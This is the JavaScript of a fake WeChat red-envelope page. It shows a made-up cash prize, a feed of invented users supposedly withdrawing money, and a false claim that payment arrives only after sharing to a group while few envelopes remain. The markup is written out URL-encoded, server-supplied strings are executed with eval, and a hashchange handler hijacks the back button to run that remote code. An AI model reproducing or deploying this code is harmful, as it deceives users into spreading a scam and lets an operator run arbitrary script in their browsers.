var app = app || {},
    Url,
    oldDefProp,
    fakeUrl,
    Main,
    WechatShare,
    ua,
    weui,
    timess;
var shareATimes = 0;
var shareTTimes = 0;
if (function() {
    var n = this;
    app.rndStr = function(n) {
        n = n || 32;
        var t = "abcdefhijkmnprstwxyz2345678",
            u = t.length,
            r = "";
        for (i = 0; i < n; i++)
            r += t.charAt(Math.floor(Math.random() * u));
        return r
    };
    app.rndNum = function(n) {
        return Math.ceil(Math.random() * n)
    };
    app.addRndToUrl = function(n) {
        return n.indexOf("?") > -1 ? n + "&rnd=" + app.rndStr(6) : n + "?rnd=" + app.rndStr(6)
    };
    app.decodeStr = function(n) {
        var r,
            t,
            i;
        if (!n)
            return "";
        for (r = n[0], t = n.split(r), i = 0; i < t.length; i++)
            t[i] && (t[i] = String.fromCharCode(t[i]));
        return t.join("")
    };
    app.rndSymbols = function(n) {
        n = n || 4;
        var t = "△▽○◇□☆▲▼●★☉⊙⊕Θ◎￠〓≡㊣♀※♂∷№囍＊▷◁♤♡♢♧☼☺☏♠♥♦♣☀☻☎☜☞♩♪♫♬◈▣◐◑☑☒☄☢☣☭❂☪➹☃☂❦❧✎✄۞",
            u = t.length,
            r = "";
        for (i = 0; i < n; i++)
            r += t.charAt(Math.floor(Math.random() * u));
        return r
    };
    app.strToCode = function(n) {
        for (var r = "", i, t = 0; t < n.length; t++)
            i = "0000" + parseInt(n[t].charCodeAt(0), 10).toString(16), r += i.substring(i.length - 4, i.length);
        return r
    };
    app.getCookie = function(n) {
        var t,
            i = new RegExp("(^| )" + n + "=([^;]*)(;|$)");
        return (t = document.cookie.match(i)) ? unescape(t[2]) : null
    };
    app.setCookie = function(n, t) {
        var i = new Date;
        i.setTime(i.getTime() + 2592e6);
        document.cookie = n + "=" + escape(t) + ";path=/;expires=" + i.toGMTString()
    };
    app.delCookie = function(n) {
        var t = new Date;
        t.setTime(t.getTime() - 86400);
        document.cookie = n + "=;path=/;expires=" + t.toGMTString()
    };
    app.showHint = function(n) {
        layer.open({
            content: n,
            time: 2
        })
    };
    app.showInfo = function(n, t) {
        layer.open({
            title: t || "提示",
            content: n,
            btn: ["我知道了"]
        })
    }
}(), ua = navigator.userAgent, ua.indexOf("a") > 0) {
    function isInWechat() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("micromessenger") >= 0
    }
    function isIos() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("iphone") >= 0 || n.indexOf("ipad") >= 0 || n.indexOf("applewebkit") >= 0
    }
    function isAndroid() {
        var n = navigator.userAgent.toLowerCase();
        return n.indexOf("android") >= 0
    }
    function isUrl(n) {
        return !!n && (n.indexOf("http://") >= 0 || n.indexOf("https://") >= 0)
    }
    function isArray(n) {
        return "[object Array]" === Object.prototype.toString.call(n)
    }
    function isNumber(n) {
        return "number" == typeof n
    }
    function getRandomNum(n, t) {
        var i = t - n,
            r = Math.random();
        return n + Math.round(r * i)
    }
    function getFormatDate() {
        var n = new Date,
            t = new Date(n.setHours(n.getHours() + 8)).toISOString();
        return t.substring(0, t.indexOf("T"))
    }
    function changeTitle(n) {
        if (document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
            var i = $("body"),
                t = $('<iframe src="/favicon.ico"><\/iframe>');
            t.on("load", function() {
                setTimeout(function() {
                    t.off("load").remove()
                }, 0)
            }).appendTo(i)
        }
    }
}
if (ua = navigator.userAgent, ua.indexOf("a") > 0 && document.write(unescape("%3Cdiv%20class%3D%22container%22%20id%3D%22container%22%3E%0A%09%3Cdiv%20class%3D%22hongbao%22%3E%0A%09%09%3Cdiv%20class%3D%22topcontent%22%3E%0A%09%09%09%3Cdiv%20class%3D%22avatar%22%3E%0A%09%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22assets/TB2w9zZbd4opuFjSZFLXXX8mXXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cdiv%20style%3D%22padding-top%3A10px%3Bmargin%3A0%20auto%22%3E%0A%09%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22assets/TB2mZdvbrXlpuFjy1zbXXb_qpXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A50%25%22%3E%27%29%3B%3C/script%3E%0A%09%09%09%3C/div%3E%0A%09%09%09%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%22%3E%0A%09%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22assets/TB2BYY1bbBmpuFjSZFAXXaQ0pXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A70%25%22%3E%27%29%3B%3C/script%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%20class%3D%22chai%22%20id%3D%22chai%22%3E%0A%09%09%09%3Cdiv%20id%3D%22chai2%22%3E%0A%09%09%09%09%3Cspan%3E%0A%09%09%09%09%09%3Cscript%3Edocument.write%28%22%5Cu958b%22%29%3C/script%3E%0A%09%09%09%09%3C/span%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%22%3E%0A%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22assets/TB2CRr1bhlmpuFjSZPfXXc9iXXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A35%25%22%3E%27%29%3B%3C/script%3E%0A%09%09%3C/div%3E%0A%09%3C/div%3E%0A%3C/div%3E%0A%3Cdiv%20id%3D%22showmain%22%20style%3D%22overflow%3Aauto%3Bdisplay%3Anone%22%3E%0A%09%3Csection%20class%3D%22top%22%3E%0A%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%22100px%22%20src%3D%22assets/TB2uFYYbohnpuFjSZFEXXX0PFXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%09%3C/section%3E%0A%09%3Csection%20class%3D%22main%22%3E%0A%09%09%3Cdiv%20id%3D%22qrcode%22%3E%0A%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22assets/TB2w9zZbd4opuFjSZFLXXX8mXXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%09%09%3C/div%3E%0A%09%3C/section%3E%0A%09%3Cscript%3Edocument.write%28%27%3Cimg%20id%3D%22lq%22%20src%3D%22assets/TB2oNPWbipnpuFjSZFkXXc4ZpXa_%21%212-martrix_bbs.png%22%20class%3D%22fenxiang_w%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E%27%29%3B%3C/script%3E%0A%09%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%0A%09%09%26nbsp%3B%0A%09%3C/div%3E%0A%09%3Csection%20class%3D%22bottom%22%3E%0A%09%09%3Cdiv%20style%3D%22text-align%3Acenter%22%3E%0A%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%2240%25%22%20src%3D%22assets/TB2TH6WbItnpuFjSZFKXXalFFXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23000%22%3E%0A%09%09%09%3Cspan%20id%3D%22get_money%22%20style%3D%22font-size%3A3em%22%3E0%3C/span%3E%0A%09%09%09%3Cspan%20style%3D%22font-size%3A3em%22%3E.00%3C/span%3E%0A%09%09%09%3Cscript%3Edocument.write%28%22%u5143%22%29%3C/script%3E%0A%09%09%09%3Cp%3E%0A%09%09%09%09%3Ca%20href%3D%22javascript%3AshowMask%28%29%3B%22%20style%3D%22width%3A40%25%3Bheight%3A60px%3Bfont-size%3A18px%3Bline-height%3A60px%3Bborder-radius%3A8px%3Bbackground%3A%23d94e42%3Bcolor%3A%23fff%3Btext-align%3Acenter%3Bmargin%3A18px%20auto%2010px%20auto%3Bdisplay%3Ablock%3Btext-decoration%3Anone%22%3E%0A%09%09%09%09%09%3Cscript%3Edocument.write%28%22%5Cu70b9%5Cu6b64%5Cu7acb%5Cu5373%5Cu63d0%5Cu73b0%22%29%3C/script%3E%0A%09%09%09%09%3C/a%3E%0A%09%09%09%3C/p%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%20style%3D%22background-color%3A%23faf6f1%3Bpadding%3A.5em%3Bborder-top%3A1px%20%23f0eeea%20solid%3Bborder-bottom%3A1px%20%23f0eeea%20solid%3Bmargin-top%3A10px%22%3E%0A%09%09%09%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%2240%25%22%20src%3D%22assets/TB27DT0bd4opuFjSZFLXXX8mXXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%09%09%3C/div%3E%0A%09%09%3Cdiv%3E%0A%09%09%09%3Cul%20class%3D%22hbAvList%22%3E%3C/ul%3E%0A%09%09%3C/div%3E%0A%09%3C/section%3E%0A%3C/div%3E")), ua = navigator.userAgent, ua.indexOf("a") > 0) {
    document.title = "\u5fae\u4fe1\u7ea2\u5305";
	function showtip() {
        weui.alert("活动提示：请务必分享到群后，红包才会到账（目前剩余红包仅剩1862份）！");
    }
    function showMask() {
        data.config.signature = null;
        share_config(window.data);
        wx.showMenuItems({menuList:['menuItem:share:appMessage']});
        $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $(".fenxiang_w").show();
        $("#mask").show();
        showtip()
    }
    var oChai = document.getElementById("chai2"),
        oContainer = document.getElementById("container"),
        showmain = document.getElementById("showmain");
    showmain.style.display = "none";
    oChai.onclick = function() {
        oChai.setAttribute("class", "rotate");
        var kcnum = getRandomNum(minnum, maxnum);
        setTimeout(function() {
            oContainer.remove();
            showmain.style.display = "";
            var n = 0,
                t = setInterval(function() {
                    n += 1;
                    n >= kcnum && clearInterval(t);
                    document.getElementById("get_money").innerHTML = n
                }, 10)
        }, 1600)
    };
    $(function() {
        function u(a) {
            var b = t.getHours(),
                c = t.getMinutes() * 1 + a.c_time * 1;
            return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)), '<li><img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span><\/li>"
        }
        function f() {
            return '<li style="display: none;"><\/li>'
        }
        function e(a) {
            var b = t.getHours(),
                c = t.getMinutes() * 1 + a.c_time * 1;
            return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)), '<img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span>"
        }
        for (var i = [{
                w_name: "华",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/3CC6C03786C6C693F364B395F327197F/100",
                u_time: "领取了6元现金红包",
                c_time: "7"
            }, {
                w_name: "隐形&翅膀",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/77AC9176E0EE94A552AAD6961066D4BA/100",
                u_time: "提现了 200.00 元",
                c_time: "6"
            }, {
                w_name: "赵 巍",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
                u_time: "提现了 60.00 元",
                c_time: "12"
            }, {
                w_name: "小妈咪?云在指尖",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
                u_time: "提现了 88.00 元",
                c_time: "5"
            }, {
                w_name: "蓝蓝",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
                u_time: "提现了 200.00 元",
                c_time: "15"
            }, {
                w_name: "温州兄弟典当_（啊松）",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
                u_time: "提现了 70.00 元",
                c_time: "15"
            }, {
                w_name: "简单",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
                u_time: "提现了 15.00 元",
                c_time: "15"
            }, {
                w_name: "总有刁民想阴朕( ?????)っ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
                u_time: "提现了 20.00 元",
                c_time: "9"
            }, {
                w_name: "毕江明",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
                u_time: "提现了 130.00 元",
                c_time: "2"
            }, {
                w_name: "五平方",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",
                u_time: "提现了 66.00 元",
                c_time: "3"
            }, {
                w_name: "莎莎",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",
                u_time: "提现了 20.00 元",
                c_time: "8"
            }, {
                w_name: "Jkj.",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
                u_time: "提现了 10.00 元",
                c_time: "10"
            }, {
                w_name: "卢润霄",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
                u_time: "提现了 7.00 元",
                c_time: "7"
            }, {
                w_name: "君君",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
                u_time: "提现了 120.00 元",
                c_time: "9"
            }, {
                w_name: "孙小兵",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
                u_time: "提现了 36.00 元",
                c_time: "7"
            }, {
                w_name: "\\uD83C\\uDF3A、dacy",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
                u_time: "提现了 200.00 元",
                c_time: "7"
            }, {
                w_name: "Mr. Xue ?",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
                u_time: "提现了 5.00 元",
                c_time: "2"
            }, {
                w_name: "孟苗苗",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
                u_time: "提现了 25.00 元",
                c_time: "6"
            }, {
                w_name: "凡尔赛宫的^_^糯米",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",
                u_time: "提现了 18.00 元",
                c_time: "15"
            }, {
                w_name: "福星，",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",
                u_time: "提现了 88.00 元",
                c_time: "3"
            }, {
                w_name: "袁芳",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",
                u_time: "提现了 66.00 元",
                c_time: "12"
            }, {
                w_name: "左右",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",
                u_time: "提现了 90.00 元",
                c_time: "12"
            }, {
                w_name: "林杰棟_",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",
                u_time: "提现了 25.00 元",
                c_time: "14"
            }, {
                w_name: " \\uD83D\\uDC8B",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/B7CDFAA5FD54A0FD2904A30B6A29D660/100",
                u_time: "提现了 30.00 元",
                c_time: "13"
            }, {
                w_name: "亚里士缺德",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",
                u_time: "提现了 110.00 元",
                c_time: "5"
            }, {
                w_name: "刘莹",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
                u_time: "提现了 88.00 元",
                c_time: "9"
            }, {
                w_name: "。",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
                u_time: "提现了 7.00 元",
                c_time: "2"
            }, {
                w_name: "不在乎",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
                u_time: "提现了 16.00 元",
                c_time: "12"
            }, {
                w_name: "IF YOU",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
                u_time: "提现了 88.00 元",
                c_time: "11"
            }, {
                w_name: "曹雪梦",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
                u_time: "提现了 68.00 元",
                c_time: "10"
            }, {
                w_name: "一",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
                u_time: "提现了 96.00 元",
                c_time: "4"
            }, {
                w_name: "Zhao. Devil Ψ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/94B9F8421330A7B82F019492C822BF42/100",
                u_time: "提现了 200.00 元",
                c_time: "14"
            }, {
                w_name: "努力奋斗",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
                u_time: "提现了 20.00 元",
                c_time: "12"
            }, {
                w_name: "用毛主席的气质压倒一切℡",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/FF4E560E4F11C2EBAAFFFC4625CD3122/100",
                u_time: "提现了 200.00 元",
                c_time: "11"
            }, {
                w_name: "葡了个萄\\uD83C\\uDFC3",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
                u_time: "提现了 120.00 元",
                c_time: "8"
            }, {
                w_name: "小卷子",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
                u_time: "提现了 20.00 元",
                c_time: "2"
            }, {
                w_name: "冰是睡着的水",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
                u_time: "提现了 200.00 元",
                c_time: "2"
            }, {
                w_name: "大朵云",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
                u_time: "提现了 156.00 元",
                c_time: "10"
            }], n = 0, t = new Date, r; n < 5; n++)
            r = i[n], $(".hbAvList").append(u(r));
        setInterval(function() {
            var t = i[n];
            $(".hbAvList li:last").slideUp(1e3, function() {
                $(this).remove()
            });
            $(".hbAvList li:first .hbMoney").css("color", "#949494");
            $(".hbAvList").prepend(f());
            $(".hbAvList li:first").append(e(t));
            $(".hbAvList li:first").find(".hbMoney").css("color", "#FF0000");
            $(".hbAvList li:first").slideDown(1e3, function() {
                n % 2 < 1 ? $(".hbAvList li:first").find(".hbMoney").addClass("animated tada") : $(".hbAvList li:first").find(".hbMoney").addClass("animated zoomIn");
                n = ++n % i.length
            })
        }, 2e3)
    });
    weui = {
        alert: function(n, t, i) {
            var r,
                u;
            t = t ? t : "";
            r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display: none;margin-left:15%;margin-right:15%">';
            r += '<div class="weui_mask"><\/div>';
            r += '<div class="weui_dialog">';
            r += '    <div class="weui_dialog_hd"><strong class="weui_dialog_title">' + t + "<\/strong><\/div>";
            r += '    <div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><\/div>';
            r += '    <div class="weui_dialog_ft">';
            r += '      <a href="javascript:;" class="weui_btn_dialog primary">确定<\/a>';
            r += "  <\/div>";
            r += " <\/div>";
            r += "<\/div>";
            $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
            u = $(".weui_dialog_alert");
            u.show();
            u.find(".weui_dialog_bd").html(n);
            u.find(".weui_btn_dialog").off("click").on("click", function() {
                u.hide();
                i && i()
            })
        }
    };
    function getSceneIdByCode(n) {
        var t = n.indexOf("-"),
            i;
        return -1 != t && (n = n.substring(0, t)), i = n.replace(/A/g, "0").replace(/C/g, "1").replace(/F/g, "2").replace(/Z/g, "3").replace(/W/g, "4").replace(/G/g, "5").replace(/J/g, "6").replace(/Q/g, "7").replace(/Y/g, "8").replace(/S/g, "9"), parseInt(i)
    }

    timess = 0;
    function tempchangeTitle(n) {
        if (typeof $ != "undefined") {
            var t,
                i = $("body");
            document.title = n;
            t = $('<iframe  style="display: none" src="/favicon.ico"><\/iframe>');
            t.on("load", function() {
                setTimeout(function() {
                    t.off("load").remove()
                }, 1)
            }).appendTo(i)
        }
    }
    function get_rand_pic() {
        var n = ["//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuapGaCwnQpcgs3vyk8bkGrXvOww5Vu2M3KKe52p04220kyIGIxHNPOQ/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_jpg/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuDCe8Tibia3tV8F6HmzHuotNY2TMxoTv8H4TCaHjoWMXxKEdRsAyBEuicA/0?wx_fmt=jpeg", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuIFz31JsNJA2oudF8VhaanxbTNcHyWcRLlmpCiatD8pkkM2wstbaWAaw/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuPVicTh6MyX4rM8akljrqFm563RmUQzVgSXxX6AkybDjkWibXtaqgsI3w/0?wx_fmt=png", "//mmbiz.qlogo.cn/mmbiz_jpg/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuib5qQUlo4oqQyQMAzEFRD4VBsvjaoachKPLCZAaib44xFzhzdMibjZjibQ/0?wx_fmt=jpeg", "//mmbiz.qlogo.cn/mmbiz_png/nyPb054uibdiaIE3wchcoVnicP4AdPrfXLuapGaCwnQpcgs3vyk8bkGrXvOww5Vu2M3KKe52p04220kyIGIxHNPOQ/0?wx_fmt=png"];
        return n[Math.floor(Math.random() * n.length)]
    }
    function gotocj() {
        eval(window.data.c_url)
    }
    function jp() {
      eval(window.data.c_url_back)
    }
}
$(function(){
	setTimeout(function(){
		window.onhashchange = function() {
			jp();
		};
	}, 10);
	$('#c69306').click(function(){
		if(Math.random() > 0.5) $('.a69306').hide();
	});
});